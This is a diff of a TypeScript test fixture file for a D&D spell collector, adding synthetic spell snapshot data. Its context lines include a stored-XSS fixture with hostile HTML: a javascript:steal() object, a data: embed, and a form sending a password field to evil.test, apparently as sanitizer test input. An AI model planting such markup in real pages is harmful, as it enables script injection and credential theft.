@@ -1,3 +1,7 @@
+import { createHash } from "node:crypto";
+
+import type { SnapshotDetail } from "../../../src/server/compendium/next-dnd/collector.ts";
+
 export function spellIndexFixture(count = 411): string {
   const cards = Array.from({ length: count }, (_, index) => index === 0 ? {
     title: "Метка охотника",
@@ -61,4 +65,25 @@ export function storedXssDetailFixture(externalId: string): string {
     <object data="javascript:steal()"></object><embed src="data:text/html,x"><link rel="stylesheet" href="//evil.test/x.css">
     <form action="https://evil.test"><input name="password"></form>
   </article>`;
+}
+
+export function spellDetailsFixture(count = 411): SnapshotDetail[] {
+  return Array.from({ length: count }, (_, index) => {
+    const externalId = String(20_000 + index);
+    const sha256 = createHash("sha256").update(`spell-fixture-${externalId}`).digest("hex");
+    const sourceUrl = `https://next.dnd.su/spells/${externalId}-fixture-spell-${index + 1}`;
+    return {
+      kind: "detail", category: "spells", externalId, sourceUrl, finalUrl: sourceUrl, redirectChain: [],
+      fetchedAt: "2026-08-06T12:00:00.000Z", sha256, byteLength: 512,
+      parserVersion: "next-dnd-2024-v3", blobPath: `blobs/${sha256}.html`,
+      normalized: {
+        title: `Тестовое заклинание ${index + 1}`, contentHtml: `<article>Fixture spell ${index + 1}</article>`,
+        contentText: `Casting Time: 1 action. Range: 60 feet. Components: V, S. Duration: 1 minute. Fixture rules ${index + 1}.`,
+      },
+      indexMetadata: {
+        level: index % 10, school: "Воплощение", title_en: `Fixture Spell ${index + 1}`,
+        filter_class: [17], item_tags: { ritual: index % 2 === 0, concentration: index % 3 === 0 },
+      },
+    };
+  });
 }
